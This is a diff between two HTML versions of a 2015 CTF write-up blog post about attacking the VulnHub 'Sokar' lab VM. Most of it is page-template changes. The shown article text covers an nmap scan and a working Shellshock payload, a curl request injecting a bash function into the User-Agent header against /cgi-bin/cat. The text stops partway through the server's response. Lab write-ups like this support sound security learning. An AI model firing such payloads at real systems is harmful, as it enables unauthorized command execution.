@@ -1,443 +1,310 @@
-<!DOCTYPE html>
-<html lang="en-us">
+<!doctype html><html lang=en>
 <head>
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> beating sokar the vulnhub turns 0b10 challenge | #!/slash/note</title>
-  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/'>
-  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="all,follow">
-  <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:title" content="beating sokar the vulnhub turns 0b10 challenge" />
+<title>
+beating sokar the vulnhub turns 0b10 challenge ::
+#!/bin/note
+— a checkbox uncheckers notepad
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="introduction Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse created Sokar.
+ Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep &amp;lsquo;14. From the competition announcement blogpost, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag. Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.
+Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!
+Here is my entry for the competition. Enjoy! :)
+">
+<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
+<meta name=robots content="noodp">
+<link rel=canonical href=https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/>
+<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
+<link rel=stylesheet href=https://leonjza.github.io/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="beating sokar the vulnhub turns 0b10 challenge">
+<meta name=twitter:description content="introduction
+Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse
+created Sokar.
+
+  
+    
+    
+  
+
+
+Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep &lsquo;14.
+From the competition announcement blogpost, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
+Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.
+Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!
+Here is my entry for the competition. Enjoy! :)">
+<meta property="og:title" content="beating sokar the vulnhub turns 0b10 challenge">
 <meta property="og:description" content="introduction
 Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse
 created Sokar.
 
+  
+    
+    
+  
 
 
 Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep &lsquo;14.
 From the competition announcement blogpost, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
 Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.
 Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!
-Here is my entry for the competition. Enjoy! :)" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2015-02-21T15:55:03+00:00" />
-<meta property="article:modified_time" content="2015-02-21T15:55:03+00:00" />
-
-
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="beating sokar the vulnhub turns 0b10 challenge"/>
-<meta name="twitter:description" content="introduction
-Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse
-created Sokar.
-
-
-
-Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep &lsquo;14.
-From the competition announcement blogpost, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
-Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.
-Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!
-Here is my entry for the competition. Enjoy! :)"/>
-
-  
-  
-    
-  
-  
-  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
-
-  
-   <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
-  
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  
-
-  
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
-
-  
-  
-  
-  
-  
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-44457032-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-  
-  
+Here is my entry for the competition. Enjoy! :)">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2015-02-21T15:55:03+00:00">
+<meta property="article:modified_time" content="2015-02-21T15:55:03+00:00"><meta property="og:site_name" content="#!/bin/note
+">
 </head>
-
-<body class="max-width mx-auto px3 ltr">
-  <div class="content index py4">
-
-  <div id="header-post">
-  <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu" style="visibility: visible;">
-    <span id="nav">
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/" aria-label="Previous">
-            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
-          </a>
-        </li>
-        
-        
-        <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/" aria-label="Next">
-            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
-          </a>
-        </li>
-        
-        <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
-          </a>
-        </li>
-        <li>
-          <a class="icon" href="#" aria-label="Share">
-            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
-          </a>
-        </li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f" aria-label="Facebook">
-      <i class="fab fa-facebook " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&text=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Twitter">
-      <i class="fab fa-twitter " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&title=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Linkedin">
-      <i class="fab fa-linkedin " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&is_video=false&description=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Pinterest">
-      <i class="fab fa-pinterest " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f" aria-label="Email">
-      <i class="fas fa-envelope " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&title=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Pocket">
-      <i class="fab fa-get-pocket " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&title=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="reddit">
-      <i class="fab fa-reddit " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&name=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge&description=%3ch2%20id%3d%22introduction%22%3eintroduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22http%3a%2f%2fblog.vulnhub.com%2f2015%2f01%2fvulnhub-is-0b10.html%22%3eVulnhub%20is%200b10%3c%2fa%3e%20years%20old.%20That%20is%20binary%20for%202%20%3a%29%20In%20order%20to%20celebrate%20this%2c%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2f_RastaMouse%22%3e%40_RastaMouse%3c%2fa%3e%0acreated%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fsokar-1%2c113%2f%22%3eSokar%3c%2fa%3e.%3c%2fp%3e%0a%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fsokar_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eSokar%20was%20used%20as%20another%20writeup%20competition%20%28the%20first%20for%202015%29%2c%20similar%20to%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f%22%3ePersistence%3c%2fa%3e%20challenge%20from%20Sep%20%26lsquo%3b14.%0aFrom%20the%20%3ca%20href%3d%22http%3a%2f%2fblog.vulnhub.com%2f2015%2f01%2fcompetition-sokar.html%22%3ecompetition%20announcement%20blogpost%3c%2fa%3e%2c%20the%20rules%20of%20engagement%20were%20pretty%20familiar.%20Boot%20the%20VM%2c%20pwn%20it%20via%20the%20network%20and%20find%20the%20flag.%0aOf%20course%2c%20modifying%20the%20VM%20in%20order%20to%20help%20you%20get%20the%20flag%20%28things%20like%20single%20user%20mode%2c%20rescue%20disks%20etc%29%20are%20not%20allowed%20and%20you%20have%20to%20actually%20be%20able%20to%20prove%20how%20you%20got%20r00t.%3c%2fp%3e%0a%3cp%3eSokar%20frustrated%20me.%20A%20lot.%20However%2c%20almost%20all%20of%20the%20challenges%20and%20configurations%20of%20Sokar%20were%20plausible.%20Most%20of%20the%20vulnerabilities%20are%20valid%20in%20the%20sense%20that%20it%20may%20as%20well%20be%20out%20there%20in%20wild.%20So%2c%20it%20was%20a%20great%20learning%20experience%20once%20again%21%3c%2fp%3e%0a%3cp%3eHere%20is%20my%20entry%20for%20the%20competition.%20Enjoy%21%20%3a%29%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&t=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Hacker News">
-      <i class="fab fa-hacker-news " aria-hidden="true"></i>
-    </a>
-  </li>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>#!/bin/note
+</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
 </ul>
-
-    </div>
-    <div id="toc">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#introduction">introduction</a></li>
-    <li><a href="#a-usual-start">a usual start</a></li>
-    <li><a href="#cgi-bincat">/cgi-bin/cat</a></li>
-    <li><a href="#making-life-easier">making life easier</a></li>
-    <li><a href="#egress-firewalls-le-suck">egress firewalls le-suck</a></li>
-    <li><a href="#bynarr-the-fruit">bynarr the fruit</a></li>
-    <li><a href="#the-scary-linux-memory-extractor">the scary linux memory extractor</a></li>
-    <li><a href="#build-the-clone-to-the-hook">build the clone to the hook</a>
-      <ul>
-        <li><a href="#the-impossible-b0f">the impossible b0f</a></li>
-        <li><a href="#inspecting-git">inspecting git</a></li>
-      </ul>
-    </li>
-    <li><a href="#rooting-sokar">rooting sokar</a>
-      <ul>
-        <li><a href="#preparing-the-environment-and-exploit">preparing the environment and exploit</a></li>
-      </ul>
-    </li>
-    <li><a href="#conclusion">conclusion</a></li>
-    <li><a href="#edit">edit</a></li>
-  </ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
 </nav>
-    </div>
-  </span>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>beating sokar the vulnhub turns 0b10 challenge</h1>
+<div class=post-meta>
+<span class=post-date>
+2015-02-21
+</span>
+<span class=post-read-time>— 31 min read</span>
 </div>
-
-
-  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-    <header>
-      <h1 class="posttitle" itemprop="name headline">
-        beating sokar the vulnhub turns 0b10 challenge
-      </h1>
-      <div class="meta">
-        
-        <div class="postdate">
-          
-          <time datetime="2015-02-21 15:55:03 &#43;0000 UTC" itemprop="datePublished">2015-02-21</time>
-          
-        </div>
-        
-        
-        
-        <div class="article-category">
-            <i class="fas fa-archive"></i>
-            
-            
-            <a class="category-link" href="https://leonjza.github.io/categories/ctf">CTF</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/solution">Solution</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/challenge">Challenge</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
-            
-        </div>
-        
-        
-      </div>
-    </header>
-
-  
-    <div class="content" itemprop="articleBody">
-      <h2 id="introduction">introduction</h2>
-<p><a href="http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html">Vulnhub is 0b10</a> years old. That is binary for 2 :) In order to celebrate this, <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a>
-created <a href="https://www.vulnhub.com/entry/sokar-1,113/">Sokar</a>.</p>
-<figure><img src="https://leonjza.github.io/images/sokar_logo.png"/>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#introduction>introduction</a></li>
+<li><a href=#a-usual-start>a usual start</a></li>
+<li><a href=#cgi-bincat>/cgi-bin/cat</a></li>
+<li><a href=#making-life-easier>making life easier</a></li>
+<li><a href=#egress-firewalls-le-suck>egress firewalls le-suck</a></li>
+<li><a href=#bynarr-the-fruit>bynarr the fruit</a></li>
+<li><a href=#the-scary-linux-memory-extractor>the scary linux memory extractor</a></li>
+<li><a href=#build-the-clone-to-the-hook>build the clone to the hook</a>
+<ul>
+<li><a href=#the-impossible-b0f>the impossible b0f</a></li>
+<li><a href=#inspecting-git>inspecting git</a></li>
+</ul>
+</li>
+<li><a href=#rooting-sokar>rooting sokar</a>
+<ul>
+<li><a href=#preparing-the-environment-and-exploit>preparing the environment and exploit</a></li>
+</ul>
+</li>
+<li><a href=#conclusion>conclusion</a></li>
+<li><a href=#edit>edit</a></li>
+</ul>
+</li>
+</ul>
+</nav></aside>
+<h2 id=introduction>introduction</h2>
+<p><a href=http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html>Vulnhub is 0b10</a> years old. That is binary for 2 :) In order to celebrate this, <a href=https://twitter.com/_RastaMouse>@_RastaMouse</a>
+created <a href=https://www.vulnhub.com/entry/sokar-1,113/>Sokar</a>.</p>
+<figure class=left>
+<img src=/images/sokar_logo.png>
 </figure>
-
-<p>Sokar was used as another writeup competition (the first for 2015), similar to the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> challenge from Sep &lsquo;14.
-From the <a href="http://blog.vulnhub.com/2015/01/competition-sokar.html">competition announcement blogpost</a>, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
+<p>Sokar was used as another writeup competition (the first for 2015), similar to the <a href=https://leonjza.github.io/blog/2014/09/18/from-persistence/>Persistence</a> challenge from Sep &lsquo;14.
+From the <a href=http://blog.vulnhub.com/2015/01/competition-sokar.html>competition announcement blogpost</a>, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
 Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.</p>
 <p>Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!</p>
 <p>Here is my entry for the competition. Enjoy! :)</p>
-<h2 id="a-usual-start">a usual start</h2>
+<h2 id=a-usual-start>a usual start</h2>
 <p>You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire <code>nmap</code> at it. I followed exactly these steps apart from using the usual <code>netdiscover</code> to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.</p>
 <p>I knew which interface the network was bound to on my Mac, so I started the sniffer with <code>sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@laptop » sudo /Applications/VMware<span style="color:#87ceeb">\ </span>Fusion.app/Contents/Library/vmnet-sniffer vmnet1
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@laptop » sudo /Applications/VMware<span style=color:#ae81ff>\ </span>Fusion.app/Contents/Library/vmnet-sniffer vmnet1
 
-[... snip IPv6 talky talky ...]
+<span style=color:#f92672>[</span>... snip IPv6 talky talky ...<span style=color:#f92672>]</span>
 
-IP src 0.0.0.0         dst 255.255.255.255 UDP src port <span style="color:#f60">68</span> dst port <span style="color:#f60">67</span>
-IP src 192.168.217.254 dst 192.168.217.163 UDP src port <span style="color:#f60">67</span> dst port <span style="color:#f60">68</span>
+IP src 0.0.0.0         dst 255.255.255.255 UDP src port <span style=color:#ae81ff>68</span> dst port <span style=color:#ae81ff>67</span>
+IP src 192.168.217.254 dst 192.168.217.163 UDP src port <span style=color:#ae81ff>67</span> dst port <span style=color:#ae81ff>68</span>
 </code></pre></div><p><strong>192.168.217.163</strong>. Great. This will be our target for a <code>nmap</code> scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don&rsquo;t rely on ICMP traffic ;)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ nmap --reason 192.168.217.163 -p-
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ nmap --reason 192.168.217.163 -p-
 
-Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-02 21:09 SAST
-Nmap scan report <span style="color:#f00">for</span> 192.168.217.163
-Host is up, received arp-response (0.00027s latency).
-Not shown: <span style="color:#f60">65534</span> filtered ports
-Reason: <span style="color:#f60">65534</span> no-responses
+Starting Nmap 6.47 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2015-02-02 21:09 SAST
+Nmap scan report <span style=color:#66d9ef>for</span> 192.168.217.163
+Host is up, received arp-response <span style=color:#f92672>(</span>0.00027s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>65534</span> filtered ports
+Reason: <span style=color:#ae81ff>65534</span> no-responses
 PORT    STATE SERVICE  REASON
 591/tcp open  http-alt syn-ack
-MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)
+MAC Address: 08:00:27:F2:40:DB <span style=color:#f92672>(</span>Cadmus Computer Systems<span style=color:#f92672>)</span>
 
-Nmap <span style="color:#f00">done</span>: <span style="color:#f60">1</span> IP address (<span style="color:#f60">1</span> host up) scanned in 1133.72 seconds
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 1133.72 seconds
 </code></pre></div><p>One port open on tcp. <code>tcp/591</code>.</p>
-<h2 id="cgi-bincat">/cgi-bin/cat</h2>
-<p>The service on <code>tcp/591</code> appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML <code>&lt;iframe&gt;</code> to http://192.168.217.163:591/cgi-bin/cat. Requesting this page alone was the same stats, minus that creepy pink color ;)</p>
-<figure><img src="https://leonjza.github.io/images/sokar_cat.png"/>
+<h2 id=cgi-bincat>/cgi-bin/cat</h2>
+<p>The service on <code>tcp/591</code> appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML <code>&lt;iframe></code> to http://192.168.217.163:591/cgi-bin/cat. Requesting this page alone was the same stats, minus that creepy pink color ;)</p>
+<figure class=left>
+<img src=/images/sokar_cat.png>
 </figure>
-
 <p>I toyed around quite a bit with this webserver. The textbook approach of running <code>wfuzz</code> to discover some web paths, <code>nikto</code> to discover some interesting information etc. was used. Alas, none of these tools proved really useful.</p>
-<p>Applying some more brain thingies to my current situation, I remembered the <a href="http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">Shellshock</a> bug disclosed in September 2014. The <code>/cgi-bin</code> path was the biggest hint towards it. I also remembered <a href="https://twitter.com/mubix">@mubix</a> was keeping a Github repository of <a href="https://github.com/mubix/shellshocker-pocs">PoC&rsquo;s for shellshock</a>, and promptly started to try a few against the CGI path.</p>
-<p>Eventually, <a href="https://gist.github.com/mfadzilr/70892f43597e7863a8dc">this</a> PoC was modified a little to get me some working command injection via shellshock:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ curl -i -X OPTIONS -H <span style="color:#87ceeb">&#34;User-Agent: () { :;};echo;/usr/bin/id&#34;</span> <span style="color:#87ceeb">&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>
-HTTP/1.1 <span style="color:#f60">200</span> OK
-Date: Mon, <span style="color:#f60">02</span> Feb <span style="color:#f60">2015</span> 21:23:07 GMT
-Server: Apache/2.2.15 (CentOS)
+<p>Applying some more brain thingies to my current situation, I remembered the <a href=http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29>Shellshock</a> bug disclosed in September 2014. The <code>/cgi-bin</code> path was the biggest hint towards it. I also remembered <a href=https://twitter.com/mubix>@mubix</a> was keeping a Github repository of <a href=https://github.com/mubix/shellshocker-pocs>PoC&rsquo;s for shellshock</a>, and promptly started to try a few against the CGI path.</p>
+<p>Eventually, <a href=https://gist.github.com/mfadzilr/70892f43597e7863a8dc>this</a> PoC was modified a little to get me some working command injection via shellshock:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ curl -i -X OPTIONS -H <span style=color:#e6db74>&#34;User-Agent: () { :;};echo;/usr/bin/id&#34;</span> <span style=color:#e6db74>&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>
+HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+Date: Mon, <span style=color:#ae81ff>02</span> Feb <span style=color:#ae81ff>2015</span> 21:23:07 GMT
+Server: Apache/2.2.15 <span style=color:#f92672>(</span>CentOS<span style=color:#f92672>)</span>
 Connection: close
 Transfer-Encoding: chunked
-Content-Type: text/plain; <span style="color:#eedd82">charset</span>=UTF-8
+Content-Type: text/plain; charset<span style=color:#f92672>=</span>UTF-8
 
